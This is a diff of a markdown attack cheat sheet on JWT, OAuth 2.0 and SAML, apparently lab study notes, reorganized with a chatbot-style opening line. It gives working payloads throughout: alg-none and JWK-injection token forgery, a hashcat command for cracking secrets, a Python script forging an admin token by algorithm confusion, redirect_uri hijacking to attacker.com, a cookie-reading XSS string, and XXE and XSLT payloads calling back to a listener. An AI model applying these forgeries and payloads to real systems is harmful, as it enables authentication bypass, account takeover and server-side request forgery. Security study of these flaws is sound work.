@@ -1,226 +1,219 @@
+Here's the fully organized version:
 
-## **I. JWT (JSON Web Token)**
+---
 
-### **1. Signature Stripping & Algorithm Manipulation**
+## I. JWT (JSON Web Token)
 
-- **Signature Removal:** Strip the signature (the third part) and see if the server accepts `header.payload.` without validation.
-    
-- **`"alg": "none"` Attack:** Modify the header to set the algorithm to `none`.
-    
-    - _Format:_ `{"alg": "none", "typ": "JWT"}`
-        
-    - _Note:_ Ensure the trailing dot remains (e.g., `header.payload.`).
-        
+### 1. Signature Stripping & Algorithm Manipulation
 
-### **2. JWK (JSON Web Key) Header Injection**
+**Signature Removal:** Strip the signature (the third part) and see if the server accepts `header.payload.` without validation.
 
-- **Scenario:** Server trusts a key provided _inside_ the token header.
-    
-- **Step 1:** Generate Malicious RSA Pair:
-    
-    Bash
-    openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
-    openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
-    
-- **Step 2:** Use **CyberChef** (**PEM to JWK**) to convert `exploit_public.pem` to a JSON object.
-    
-- **Step 3:** In **JWT.io**:
-    
-    1. Replace only the `jwk` object details in the **Header**.
-        
-    2. Modify **Payload** (e.g., `"admin": true`).
-        
-    3. In **Verify Signature**, select **RS256** and set the format to **PEM**.
-        
-    4. Paste `exploit_private.pem` into the private key box.
-        
+**`"alg": "none"` Attack:** Modify the header to set the algorithm to `none`.
 
-### **3. Cross-Application Token Injection**
+- Format: `{"alg": "none", "typ": "JWT"}`
+- Note: Ensure the trailing dot remains (e.g., `header.payload.`).
 
-- **Scenario:** Company has `socialA.com` and `socialB.com`.
-    
-- **Test:** If you have high privileges on A and low on B, try using the JWT from A to access B.
-    
-- **Check:** Verify if the server fails to validate `aud` (audience) or `iss` (issuer) claims.
-    
+---
 
-### **4. Secret Key Brute-Forcing (HS256)**
+### 2. JWK (JSON Web Key) Header Injection
 
-- Command: ```bash
-    
-    hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
-    
+**Scenario:** Server trusts a key provided inside the token header.
 
-### **5. Key Forgery & Algorithm Confusion**
+**Step 1 — Generate Malicious RSA Pair:**
 
-- **Tool:** `jwt_forgery.py` (via Sig2n Docker).
-    
-- **Process:** Supply multiple JWTs to derive the public key.
-    
-    Bash
-    
-    ```
-    docker run -it sig2n /bin/bash
-    python3 jwt_forgery.py 'JWT_1' 'JWT_2' 'JWT_3'
-    ```
-    python3 -c "
+```bash
+openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
+openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
+```
+
+**Step 2 — Convert to JWK:** Use CyberChef (PEM to JWK) to convert `exploit_public.pem` to a JSON object.
+
+**Step 3 — Sign in JWT.io:**
+
+1.  In Verify Signature, select RS256 and set format to PEM.
+2. Modify Payload (e.g., `"admin": true`).
+3. Replace only the `jwk` object details in the Header.
+4. Paste `exploit_private.pem` into the private key box.
+
+---
+
+### 3. Cross-Application Token Injection
+
+**Scenario:** Company has `socialA.com` and `socialB.com`.
+
+**Test:** If you have high privileges on A and low on B, try using the JWT from A to access B.
+
+**Check:** Verify if the server fails to validate `aud` (audience) or `iss` (issuer) claims.
+
+---
+
+### 4. Secret Key Brute-Forcing (HS256)
+
+```bash
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
+```
+
+---
+
+### 5. Key Forgery & Algorithm Confusion (RS256 → HS256)
+
+**Concept:** Recover the RSA public key from multiple JWT signatures, then forge a new token signed with that public key as the HMAC secret.
+
+**Step 1 — Recover the public key:**
+
+```bash
+docker run -it sig2n /bin/bash
+python3 jwt_forgery.py 'JWT_1' 'JWT_2' 'JWT_3' 'JWT_4'
+```
+
+Output: `<id>_65537_x509.pem` and `<id>_65537_pkcs1.pem`
+
+**Step 2 — Forge a signed token (run inside the container):**
+
+```bash
+python3 -c "
 import hmac, hashlib, base64, json
 
-header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
+header  = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
 payload = base64.urlsafe_b64encode(json.dumps({'user':'htb-stdnt','isAdmin':True,'exp':1776873353}).encode()).rstrip(b'=')
 
-with open('b1969268f0e66b1c_65537_x509.pem', 'rb') as f:
+with open('<id>_65537_x509.pem', 'rb') as f:
     key = f.read()
 
 msg = header + b'.' + payload
 sig = base64.urlsafe_b64encode(hmac.new(key, msg, hashlib.sha256).digest()).rstrip(b'=')
 print((msg + b'.' + sig).decode())
 "
-- **Sign:** Take the resulting `*509.pem` and use **CyberChef (JWT Sign)** to sign your forged payload.
-    
+```
+
+> If x509 gives 401, retry with `_pkcs1.pem`.
+
+**Step 3 — Use the forged token:** Send it in the `session` cookie (or `Authorization: Bearer`) to the target endpoint.
 
 ---
 
-## **II. OAuth 2.0**
+## II. OAuth 2.0
 
-### **1. Redirect URI Manipulation**
+### 1. Redirect URI Manipulation
 
-- **Attack:** Change `redirect_uri` to your server (`attacker.com`) to steal the `code` or `token`.
-    
-- **Bypasses:** Try subdomains (`victim.com.attacker.com`), path traversal (`/../`), or regex flaws.
-    
+**Attack:** Change `redirect_uri` to your server (`attacker.com`) to steal the `code` or `token`.
 
-### **2. Cross-Site Token Injection**
-
-- **Test:** Obtain a token for your account on one site and see if it works to log you into a different site using the same provider.
-    
-
-### **3. CSRF via State Parameter**
-
-- **Flaw:** `state` is missing, static, or unvalidated.
-    
-- **Attack:** Link an attacker’s social identity to a victim’s account by sending them a callback URL you generated.
-    
-
-### **4. Parameter Injection & XSS**
-
-- **Test:** Inject payloads into `state`, `client_id`, or `scope`.
-    
-- **Payload:** `&state=<script>alert(document.cookie)</script>` or `<img>` tags to leak headers.
-    
+**Bypasses:** Try subdomains (`victim.com.attacker.com`), path traversal (`/../`), or regex flaws.
 
 ---
 
-## **III. SAML (Security Assertion Markup Language)**
+### 2. Cross-Site Token Injection
 
-### **1. Signature Exclusion (Stripping)**
-
-- **Technique:** Intercept the `SAMLResponse`.
-    
-- **Action:** Delete the entire `<ds:Signature> ... </ds:Signature>` block.
-    
-- **Test:** Modify the `NameID` to a target user and see if the Service Provider accepts the unsigned assertion.
-    
-
-### **2. XML Signature Wrapping (XSW)**
-
-- Technique: 1. Capture a valid signed SAML response.
-    
-    2. Clone the <saml:Assertion> block.
-    
-    3. Modify the first (cloned) assertion: Delete the signature block (<ds:Signature> ... </ds:Signature>) and change the user ID.
-    
-    4. Wrap: Paste this malicious assertion before the original signed one.
-    
-- **Logic:** The server validates the signature on the _original_ but the application processes the _first_ (malicious) assertion.
-    
-
-
-### **3. SAML XXE Injection (XML External Entity)**
-
-If the Service Provider’s XML parser is misconfigured to resolve external entities, you can trigger a "Blind" XXE to leak data or perform Server-Side Request Forgery (SSRF).
-
-- Step 1: Prepare your Listener
-    
-    Start a listener on your machine to confirm the outbound connection:
-    
-    Bash
-    
-    ```
-    nc -lnvp 8000
-    ```
-    
-- Step 2: Craft the Payload
-    
-    Define an external entity at the very beginning of the XML document:
-    
-    XML
-    
-    ```
-    <?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://[YOUR_IP]:8000"> %xxe; ]>
-    <samlp:Response> ... </samlp:Response>
-    ```
-    
-- **Step 3: Encode and Send**
-    
-    1. Take your raw XML with the payload.
-        
-    2. **Base64-encode** the entire string.
-        
-    3. **URL-encode** the resulting Base64 string.
-        
-    4. Submit it via the `SAMLResponse` parameter in a POST request.
-        
-- Step 4: Verify
-    
-    If you receive a GET / HTTP/1.1 connection on your listener, the server is vulnerable to XXE.
-    
+**Test:** Obtain a token for your account on one site and see if it works to log you into a different site using the same provider.
 
 ---
 
-### **4. XSLT Server-Side Injection**
+### 3. CSRF via State Parameter
 
-This attack targets the XML parser's ability to process **eXtensible Stylesheet Language Transformations**. If a parser handles these transformations unsafely, you can force the server to execute malicious logic or reach out to external servers.
+**Flaw:** `state` is missing, static, or unvalidated.
 
-- Step 1: Craft the XSLT Payload
-    
-    Create a payload that uses the document() function to make an external request:
-    
-    XML
-    
-    ```
-    <?xml version="1.0" encoding="utf-8"?>
-    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-      <xsl:template match="/">
-        <xsl:copy-of select="document('http://[YOUR_IP]:8000/')"/>
-      </xsl:template>
-    </xsl:stylesheet>
-    ```
-    
-- **Step 2: Injection Methods**
-    
-    - **Method A (Direct):** Replace the entire `SAMLResponse` with the Base64/URL-encoded version of the payload above. (The server might error out, but the connection might still trigger).
-        
-    - **Method B (Embedded):** Inject the payload inside the `<ds:Transform>` node of a **valid** SAML response. This tests if the transformation is triggered only during the validation of a "legit" token.
-        
-- Step 3: Verify
-    
-    Check your listener (nc -lnvp 8000) for a connection. Even if the application returns an error (Access Denied), a successful connection confirms the vulnerability.
-    
+**Attack:** Link an attacker's social identity to a victim's account by sending them a callback URL you generated.
+
+---
+
+### 4. Parameter Injection & XSS
+
+**Test:** Inject payloads into `state`, `client_id`, or `scope`.
+
+**Payloads:**
+
+```
+&state=<script>alert(document.cookie)</script>
+<img> tags to leak headers
+```
+
+---
+
+## III. SAML (Security Assertion Markup Language)
+
+### 1. Signature Exclusion (Stripping)
+
+**Technique:** Intercept the `SAMLResponse`.
+
+**Action:** Delete the entire `<ds:Signature> ... </ds:Signature>` block.
+
+**Test:** Modify the `NameID` to a target user and see if the Service Provider accepts the unsigned assertion.
+
+---
+
+### 2. XML Signature Wrapping (XSW)
+
+1. Capture a valid signed SAML response.
+2. Clone the `<saml:Assertion>` block.
+3. Modify the first (cloned) assertion: delete the `<ds:Signature>` block and change the user ID.
+4. Wrap: paste the malicious assertion before the original signed one.
+
+**Logic:** The server validates the signature on the original but the application processes the first (malicious) assertion.
+
+---
+
+### 3. SAML XXE Injection
+
+**Step 1 — Start a listener:**
+
+```bash
+nc -lnvp 8000
+```
+
+**Step 2 — Craft the payload:**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://[YOUR_IP]:8000"> %xxe; ]>
+<samlp:Response> ... </samlp:Response>
+```
+
+**Step 3 — Encode and send:**
+
+1. Take your raw XML with the payload.
+2. Base64-encode the entire string.
+3. URL-encode the resulting Base64 string.
+4. Submit via the `SAMLResponse` parameter in a POST request.
+
+**Step 4 — Verify:** If you receive `GET / HTTP/1.1` on your listener, the server is vulnerable.
+
+---
+
+### 4. XSLT Server-Side Injection
+
+**Step 1 — Craft the XSLT payload:**
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:copy-of select="document('http://[YOUR_IP]:8000/')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+**Step 2 — Injection methods:**
+
+- **Method A (Direct):** Replace the entire `SAMLResponse` with the Base64/URL-encoded payload. The server may error but the connection may still trigger.
+- **Method B (Embedded):** Inject the payload inside the `<ds:Transform>` node of a valid SAML response to test if transformation triggers during validation.
+
+**Step 3 — Verify:** Check your listener for a connection. Even an `Access Denied` response with a successful connection confirms the vulnerability.
 
 ---
 
 ## New Tricks
 
-### Trick 1
+**Trick 1 — Unsigned token accepted:**
+
 - Scenario: Algorithm confusion accepted unsigned token and escalated role.
 - Payload: `{"alg":"none","typ":"JWT"}.{"sub":"1","role":"admin"}.`
 
-### Trick 2
-- Scenario: Weak HMAC secret cracked, then forged admin session token.
-- Payload: `jwt payload: {"sub":"1","role":"admin"} signed with secret "secret123"`
+**Trick 2 — Weak secret cracked:**
 
-### Trick 3
+- Scenario: Weak HMAC secret cracked, then forged admin session token.
+- Payload: `{"sub":"1","role":"admin"}` signed with secret `"secret123"`
+
+**Trick 3 — OAuth open redirect:**
+
 - Scenario: OAuth redirect accepted open redirect and captured authorization code.
 - Payload: `redirect_uri=https://trusted.tld/cb?next=https://attacker.tld/capture`
